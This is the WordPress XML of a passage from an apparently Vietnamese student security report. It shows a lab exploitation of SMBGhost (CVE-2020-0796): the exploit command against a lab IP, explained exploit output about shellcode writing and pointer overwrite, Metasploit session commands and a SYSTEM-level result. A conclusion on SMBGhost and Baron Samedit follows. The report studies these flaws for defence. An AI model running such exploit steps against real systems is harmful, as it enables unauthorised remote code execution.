        <w:keepNext/>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="1C405F5E" wp14:editId="6C974940">
            <wp:extent cx="5256530" cy="970915"/>
            <wp:effectExtent l="9525" t="9525" r="10795" b="10160"/>
            <wp:docPr id="304817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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5256530" cy="970915"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:solidFill>
                        <a:schemeClr val="tx1"/>
                      </a:solidFill>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3C3B56" w14:textId="234FFD13" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="56" w:name="_Toc184042072"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003E54C8">
        <w:t>Lắng nghe kết nối đến trên máy Attacker</w:t>
      </w:r>
      <w:bookmarkEnd w:id="56"/>
    </w:p>
    <w:p w14:paraId="3ABD3FF0" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Tiến hành khai thác lỗ hổng SMBGhost bằng cách thực thi chương trình exploit.py bằng câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094AB108" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t># python3 exploit.py -ip 192.168.10.87 -p 445</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D2262E" w14:textId="48EF137A" w:rsidR="003E54C8" w:rsidRDefault="00F2370F" w:rsidP="003E54C8">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="16CAFA67" wp14:editId="03F4F50C">
            <wp:extent cx="5267960" cy="1879600"/>
            <wp:effectExtent l="9525" t="9525" r="18415" b="15875"/>
            <wp:docPr id="1823232228" name="Picture 1823232228"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ình ảnh"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId37"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5267960" cy="1879600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:solidFill>
                        <a:schemeClr val="tx1"/>
                      </a:solidFill>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="11764764" w14:textId="0C5A6874" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="57" w:name="_Toc184042073"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Kết quả khai thác lỗ hổng SMBGhost</w:t>
      </w:r>
      <w:bookmarkEnd w:id="57"/>
    </w:p>
    <w:p w14:paraId="1320AFA1" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Giải thích kết quả đầu ra:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27815ABB" w14:textId="1649609A" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">found low stub at phys addr </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>13000!:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Chương trình đã tìm thấy một địa chỉ vùng nhớ thấp (low stub) tại địa chỉ vật lý 0x13000. Đây có thể là một phần của bộ nhớ mà chương trình sẽ sử dụng để thực hiện khai thác.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E32457" w14:textId="329E4440" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>PML4 at 1aa000: Địa chỉ vùng nhớ của bảng trang PML4 đã được xác định là 0x1AA000. Bảng trang PML4 là một thành phần quan trọng trong cơ chế quản lý bộ nhớ của hệ điều hành.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007C6C1F" w14:textId="3EE5476E" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>base of HAL heap at fffff796c0000000: Địa chỉ cơ sở (base) của heap HAL (Hardware Abstraction Layer) đã được xác định là 0xfffff796c0000000. Heap là một khu vực trong bộ nhớ được sử dụng để quản lý động các đối tượng dữ liệu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54632ECC" w14:textId="0106EA4F" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>found PML4 self-ref entry 18b: Chương trình đã tìm thấy một mục (entry) tự tham chiếu trong bảng PML4, và giá trị của nó là 0x18B.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C76ED5E" w14:textId="40018D5F" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>found HalpInterruptController at fffff796c0001460: Địa chỉ vùng nhớ của HalpInterruptController đã được xác định là 0xfffff796c0001460.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B98318D" w14:textId="3699342A" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>found HalpApicRequestInterrupt at fffff8075c4b7bb0: Địa chỉ vùng nhớ của HalpApicRequestInterrupt đã được xác định là 0xfffff8075c4b7bb0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F93AA6" w14:textId="55A94CB3" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">built </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>shellcode!:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Chương trình đã xây dựng thành công một đoạn mã shellcode, đây là mã máy mà attacker có thể chèn vào hệ thống để thực hiện các hành động không được ủy quyền.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3688D955" w14:textId="10FC94DF" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>KUSER_SHARED_DATA PTE at ffffc5fbc0000000: Địa chỉ vùng nhớ của trang bảng PTE (Page Table Entry) của KUSER_SHARED_DATA đã được xác định là 0xffffc5fbc0000000.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDB0976" w14:textId="1B7DE628" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">KUSER_SHARED_DATA PTE NX bit </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>cleared!:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Bit NX (No Execute) trong PTE của KUSER_SHARED_DATA đã được xóa (cleared). Điều này có thể là một bước quan trọng để cho phép thực hiện mã máy trên vùng nhớ này.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5266ACF1" w14:textId="27032ECB" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Wrote shellcode at fffff</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>78000000950!:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Đoạn mã shellcode đã được ghi vào vùng nhớ có địa chỉ 0xfffff78000000950.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70512F4F" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Press a key to execute </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>shellcode!:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Chương trình yêu cầu người dùng nhấn một phím để tiếp tục và thực hiện shellcode.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2322D650" w14:textId="0EA5238A" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>overwrote HalpInterruptController pointer, should have execution shortly...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A849069" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Thông báo ghi đè con trỏ HalpInterruptController, quá trình thực hiện shellcode sẽ sớm được thực thi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA4BB5A" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Tại cửa sổ msfconsole, nhận được 1 session RCE tới VM có địa chỉ ip 192.168.10.87 port 49673. Xem thông tin các session đang có bằng câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB42FCE" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="004507C4">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>msf6 &gt; sessions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="679ACFF2" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Sử dụng sessions 1 bằng câu lệnh sau, thành công khai thác CVE-2020-0796:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7E6A28" w14:textId="0EC2B80A" w:rsidR="00342EA0" w:rsidRPr="00722F6E" w:rsidRDefault="003E54C8" w:rsidP="004507C4">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>msf6 &gt; sessions 1</w:t>
      </w:r>
      <w:r w:rsidR="004837E3">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD74E94" w14:textId="77777777" w:rsidR="00F2370F" w:rsidRDefault="00F2370F" w:rsidP="00F2370F">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="58" w:name="_Toc9864374"/>
      <w:bookmarkStart w:id="59" w:name="_Toc87264881"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Batang" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="454263E7" wp14:editId="1EFF7222">
            <wp:extent cx="5269865" cy="3529330"/>
            <wp:effectExtent l="9525" t="9525" r="16510" b="23495"/>
            <wp:docPr id="2" name="Picture 2" descr="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ình ảnh (1)"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId38"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5269865" cy="3529330"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:solidFill>
                        <a:schemeClr val="tx1"/>
                      </a:solidFill>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEE3D62" w14:textId="630220CB" w:rsidR="00F2370F" w:rsidRDefault="00F2370F" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="60" w:name="_Toc184042074"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F2370F">
        <w:t>RCE thành công với quyền system trên máy mục tiêu</w:t>
      </w:r>
      <w:bookmarkEnd w:id="60"/>
    </w:p>
    <w:p w14:paraId="7B549820" w14:textId="170EC63A" w:rsidR="007871AB" w:rsidRDefault="007871AB" w:rsidP="00F2370F">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C71165" w14:textId="2C5CB33B" w:rsidR="00EE50A3" w:rsidRDefault="00EE50A3" w:rsidP="00EE50A3">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:bookmarkStart w:id="61" w:name="_Toc185277790"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>KẾT LUẬN</w:t>
      </w:r>
      <w:bookmarkEnd w:id="58"/>
      <w:bookmarkEnd w:id="59"/>
      <w:bookmarkEnd w:id="61"/>
    </w:p>
    <w:p w14:paraId="55FDB5E8" w14:textId="7FE9F36A" w:rsidR="004837E3" w:rsidRDefault="004507C4" w:rsidP="004837E3">
      <w:pPr>
        <w:spacing w:before="0" w:after="200" w:line="276" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidRPr="004507C4">
        <w:t>hông qua quá trình nghiên cứu đề tài khai thác lỗ hổng phần mềm “CVE-2020-0796(SMBGhost) và CVE-202</w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="004507C4">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>3156</w:t>
      </w:r>
      <w:r w:rsidRPr="004507C4">
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:t>Baron Samedit</w:t>
      </w:r>
      <w:r w:rsidRPr="004507C4">
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00746169">
        <w:t xml:space="preserve"> sử dụng Shell code</w:t>
      </w:r>
      <w:r w:rsidRPr="004507C4">
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> đề tài đã đạt được một số kết quả c</w:t>
      </w:r>
      <w:r w:rsidR="004837E3">
        <w:t>ụ thể:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0138674B" w14:textId="4F87509A" w:rsidR="004837E3" w:rsidRDefault="004837E3" w:rsidP="004837E3">
      <w:pPr>
        <w:spacing w:before="0" w:after="200" w:line="276" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Chương 1 đã cung cấp </w:t>
      </w:r>
      <w:r w:rsidR="004507C4">
        <w:t>cơ sở lý thuyết về lỗ hổng phần mềm</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="004507C4">
        <w:t xml:space="preserve">đồng thời </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">giới thiệu về </w:t>
      </w:r>
      <w:r w:rsidR="004507C4">
        <w:t>Shellcode</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004507C4">
        <w:t>phân loại cũng như cách phòng chống</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="004507C4" w:rsidRPr="004507C4">
        <w:t>Những nội dung này tạo nền tảng vững chắc, có cái nhìn tổng quan</w:t>
      </w:r>
      <w:r w:rsidR="004507C4">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="004507C4" w:rsidRPr="004507C4">
        <w:t xml:space="preserve"> sâu sắc hơn về các lỗ hổng phần mềm và cách thức bảo vệ hệ thống khỏi các mối đe dọa</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BDF4BD6" w14:textId="04C80583" w:rsidR="004837E3" w:rsidRDefault="004837E3" w:rsidP="004837E3">
      <w:pPr>
        <w:spacing w:before="0" w:after="200" w:line="276" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Chương 2 </w:t>
      </w:r>
      <w:r w:rsidR="004507C4" w:rsidRPr="004507C4">
        <w:t>đi sâu vào phân tích hai lỗ hổng bảo mật nổi bật: CVE-2020-0796 (SMBGhost) và CVE-2021-3156 (Baron Samedit). Qua nghiên cứu, chúng ta nhận thấy cả hai lỗ hổng đều có mức độ nguy hiểm cao và có thể khai thác từ xa, gây ảnh hưởng nghiêm trọng đến hệ thống nếu không được vá kịp thời. SMBGhost, với khả năng khai thác qua giao thức SMBv3, có thể cho phép kẻ tấn công thực thi mã độc từ xa mà không cần sự tương tác của người dùng. Trong khi đó, Baron Samedit, liên quan đến việc thiếu kiểm tra đầu vào trong Sudo, cho phép kẻ tấn công vượt qua cơ chế phân quyền của hệ thống, từ đó chiếm quyền root. Các biện pháp phòng ngừa như cập nhật bản vá, cấu hình lại hệ thống, và giám sát an ninh là cần thiết để giảm thiểu nguy cơ từ những lỗ hổng này. Việc hiểu rõ cơ chế hoạt động của các lỗ hổng giúp chúng ta tăng cường khả năng phòng chống và bảo vệ hệ thống khỏi các mối đe dọa ngày càng tinh vi</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706D354B" w14:textId="4DC64074" w:rsidR="004837E3" w:rsidRDefault="004837E3" w:rsidP="004837E3">
      <w:pPr>
        <w:spacing w:before="0" w:after="200" w:line="276" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Chương 3 </w:t>
      </w:r>
      <w:r w:rsidR="004507C4" w:rsidRPr="004507C4">
        <w:t>đã trình bày quá trình triển khai thực nghiệm nhằm kiểm tra và đánh giá các lỗ hổng bảo mật đã nghiên cứu. Thông qua các bước triển khai cụ thể, chúng ta đã tái tạo môi trường thực tế để xác minh mức độ nguy hiểm và phương thức khai thác của các lỗ hổng CVE-2020-0796 (SMBGhost) và CVE-2021-3156 (Baron Samedit). Các thử nghiệm này không chỉ giúp hiểu rõ hơn về cách thức các lỗ hổng có thể bị khai thác mà còn tạo cơ sở để phát triển các giải pháp phòng chống hiệu quả. Kết quả thực nghiệm cung cấp những bài học quý giá trong việc phát hiện và khắc phục các lỗ hổng bảo mật, đồng thời nhấn mạnh tầm quan trọng của việc duy trì cập nhật bảo mật thường xuyên và cấu hình hệ thống đúng cách để đảm bảo an toàn cho hạ tầng công nghệ thông tin</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF321AA" w14:textId="441D4A94" w:rsidR="00EE50A3" w:rsidRPr="001C3045" w:rsidRDefault="004837E3" w:rsidP="00D22C9A">
      <w:pPr>
        <w:spacing w:before="0" w:after="200" w:line="276" w:lineRule="auto"/>
        <w:ind w:firstLine="633"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Qua quá trình thực hiện đề tài này, nhất là quá trình thực nghiệm, </w:t>
      </w:r>
      <w:r w:rsidR="00404722" w:rsidRPr="00404722">
        <w:t>chúng em đã thu được những kiến thức sâu sắc về các lỗ hổng bảo mật và cách thức chúng có thể bị khai thác</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00404722">
        <w:t xml:space="preserve">Chúng em </w:t>
      </w:r>
      <w:r w:rsidR="00404722" w:rsidRPr="00404722">
        <w:t>tin rằng kết quả của đề tài sẽ đóng góp một phần quan trọng trong việc quản lý và bảo vệ hệ thống, từ đó giảm thiểu những thiệt hại do các mối đe dọa an ninh mạng gây ra, giúp hệ thống luôn được duy trì trong trạng thái an toàn và ổn định</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00EE50A3">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="635F45A8" w14:textId="77777777" w:rsidR="00AA4795" w:rsidRDefault="00AA4795" w:rsidP="00AA4795">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:bookmarkStart w:id="62" w:name="_Toc87264882"/>
      <w:bookmarkStart w:id="63" w:name="_Toc185277791"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>TÀI LIỆU THAM KHẢO</w:t>
      </w:r>
      <w:bookmarkEnd w:id="62"/>
      <w:bookmarkEnd w:id="63"/>
    </w:p>
    <w:p w14:paraId="03177212" w14:textId="77777777" w:rsidR="008F7596" w:rsidRPr="00BF62A0" w:rsidRDefault="008F7596" w:rsidP="008F7596">
      <w:pPr>
        <w:pStyle w:val="Tiliuthamkho"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF62A0">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Tài liệ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>u t</w:t>
      </w:r>
